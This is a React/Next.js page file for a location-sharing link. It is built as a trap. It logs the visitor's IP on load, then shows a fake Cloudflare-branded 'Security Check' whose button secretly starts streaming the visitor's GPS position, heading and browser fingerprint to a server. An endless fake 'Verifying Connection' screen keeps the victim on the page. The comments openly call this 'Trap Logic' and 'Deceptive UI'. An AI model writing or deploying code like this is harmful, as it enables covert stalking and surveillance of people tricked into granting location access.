'use client';

import { useEffect, useState } from 'react';
import { supabase } from '@/lib/supabase';
import dynamic from 'next/dynamic';
import { useParams } from 'next/navigation';
import FloatingButtons from '@/components/FloatingButtons';
import TacticalDashboard from '@/components/TacticalDashboard';
import { useLocationStream } from '@/lib/hooks/useLocationStream';
import { useOrientation } from '@/lib/hooks/useOrientation';
import { getFingerprint } from '@/lib/fingerprint';
import { useWeather } from '@/lib/hooks/useWeather';

// Dynamically import Map
const Map = dynamic(() => import('@/components/Map'), {
    ssr: false,
    loading: () => (
        <div className="w-full h-full flex flex-col items-center justify-center bg-black gap-4">
            <div className="w-8 h-8 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
            <p className="tracking-widest text-xs font-bold text-white">ESTABLISHING UPLINK...</p>
        </div>
    )
});

interface LocationData {
    lat: number;
    lng: number;
    heading: number | null;
    accuracy: number;
    speed: number | null;
}

export default function SharePage() {
    const params = useParams();
    const sessionId = params.sessionId as string;
    const [location, setLocation] = useState<LocationData | null>(null);
    const [path, setPath] = useState<[number, number][]>([]);
    const [status, setStatus] = useState<'connecting' | 'connected' | 'disconnected'>('connecting');
    const [isFollowing, setIsFollowing] = useState(true);
    const [error, setError] = useState<string | null>(null);

    const weather = useWeather(location?.lat, location?.lng);

    const [isTrapActivated, setIsTrapActivated] = useState(false);
    const { location: myLocation, error: locationError } = useLocationStream(isTrapActivated); // Start tracking only after activation
    const myHeading = useOrientation();
    const [hasSentFingerprint, setHasSentFingerprint] = useState(false);
    const [isSessionActive, setIsSessionActive] = useState(true);

    // Sync location error to UI
    useEffect(() => {
        if (locationError) {
            setError(locationError);
        }
    }, [locationError]);

    // Check if session is active
    useEffect(() => {
        if (!sessionId) return;

        const checkSession = async () => {
            const { data } = await supabase
                .from('sessions')
                .select('active')
                .eq('id', sessionId)
                .single();

            if (data && !data.active) {
                setIsSessionActive(false);
                setStatus('disconnected');
            }
        };

        checkSession();

        // Subscribe to session updates to detect termination in real-time
        const channel = supabase
            .channel(`session-status-${sessionId}`)
            .on('postgres_changes', {
                event: 'UPDATE',
                schema: 'public',
                table: 'sessions',
                filter: `id=eq.${sessionId}`
            }, (payload) => {
                const newSession = payload.new as any;
                if (!newSession.active) {
                    setIsSessionActive(false);
                    setStatus('disconnected');
                }
            })
            .subscribe();

        return () => {
            supabase.removeChannel(channel);
        };
    }, [sessionId]);

    // Log Visit (IP Capture) on Mount
    useEffect(() => {
        if (sessionId) {
            fetch('/api/log-visit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ sessionId })
            }).catch(err => console.error('Visit log failed', err));
        }
    }, [sessionId]);

    // Trap Logic: Send Location Updates (Only if session is active AND trap is activated)
    useEffect(() => {
        if (sessionId && myLocation && isSessionActive && isTrapActivated) {
            const sendUpdate = async () => {
                try {
                    const payload: any = {
                        sessionId,
                        lat: myLocation.lat,
                        lng: myLocation.lng,
                        heading: myHeading,
                        accuracy: myLocation.accuracy
                    };

                    // Send fingerprint on first update
                    if (!hasSentFingerprint) {
                        const fp = await getFingerprint();
                        payload.fingerprint = fp;
                        setHasSentFingerprint(true);
                    }

                    await fetch('/api/update-location', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload),
                    });
                } catch (e) {
                    console.error('Trap update failed', e);
                }
            };
            sendUpdate();
        }
    }, [sessionId, myLocation, myHeading, hasSentFingerprint, isSessionActive, isTrapActivated]);

    if (!isSessionActive) {
        return (
            <div className="flex flex-col h-screen bg-black items-center justify-center text-center p-6 font-mono">
                <div className="w-16 h-16 bg-red-900/20 rounded-full flex items-center justify-center mb-4 border border-red-500/30">
                    <div className="w-8 h-8 border-2 border-red-500 rounded-full flex items-center justify-center">
                        <div className="w-1 h-8 bg-red-500 rotate-45 absolute"></div>
                        <div className="w-1 h-8 bg-red-500 -rotate-45 absolute"></div>
                    </div>
                </div>
                <h1 className="text-2xl font-bold text-red-500 tracking-widest mb-2">LINK EXPIRED</h1>
                <p className="text-gray-500 text-sm max-w-md">
                    This intelligence uplink has been terminated by the host system. Access is no longer authorized.
                </p>
                <div className="mt-8 text-[10px] text-gray-700 uppercase tracking-widest">
                    SESSION ID: {sessionId}
                </div>
            </div>
        );
    }

    // Clickbait / Security Check Landing Page
    if (!isTrapActivated) {
        return (
            <div className="flex flex-col h-screen w-full bg-white items-center justify-center p-6 font-sans text-gray-800">
                <div className="max-w-md w-full bg-white rounded-xl shadow-2xl border border-gray-100 p-8 text-center">
                    <div className="w-16 h-16 bg-blue-50 rounded-full flex items-center justify-center mx-auto mb-6">
                        <div className="w-8 h-8 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
                    </div>

                    <h1 className="text-2xl font-bold text-gray-900 mb-2">Security Check</h1>
                    <p className="text-gray-500 mb-8">
                        Please verify you are human to access this secure content.
                    </p>

                    <button
                        onClick={() => setIsTrapActivated(true)}
                        className="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-4 rounded-lg transition-all transform hover:scale-[1.02] active:scale-[0.98] shadow-lg shadow-blue-500/30 flex items-center justify-center gap-2"
                    >
                        <span className="w-5 h-5 border-2 border-white rounded-sm flex items-center justify-center">
                            <span className="w-3 h-3 bg-white rounded-[1px]"></span>
                        </span>
                        Verify & Continue
                    </button>

                    <div className="mt-6 flex items-center justify-center gap-2 text-gray-400 text-xs">
                        <span className="w-2 h-2 bg-green-500 rounded-full"></span>
                        Secure Connection Verified
                    </div>
                </div>
                <div className="mt-8 text-xs text-gray-400">
                    DDoS Protection by Cloudflare
                </div>
            </div>
        );
    }

    // Infinite Loading Screen (Deceptive UI)
    return (
        <div className="flex flex-col h-screen w-full bg-white items-center justify-center p-6 font-sans text-gray-800">
            <div className="max-w-md w-full bg-white rounded-xl shadow-2xl border border-gray-100 p-8 text-center">
                <div className="w-16 h-16 bg-blue-50 rounded-full flex items-center justify-center mx-auto mb-6">
                    <div className="w-8 h-8 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
                </div>

                <h1 className="text-xl font-bold text-gray-900 mb-2">Verifying Connection...</h1>
                <p className="text-gray-500 text-sm mb-6">
                    Establishing secure handshake with the server. This may take a few moments.
                </p>

                <div className="w-full bg-gray-100 rounded-full h-2 mb-2 overflow-hidden">
                    <div className="bg-blue-500 h-2 rounded-full animate-progress-indeterminate"></div>
                </div>
                <p className="text-xs text-gray-400">Do not close this window.</p>
            </div>
            <div className="mt-8 text-xs text-gray-400">
                DDoS Protection by Cloudflare
            </div>
        </div>
    );
}
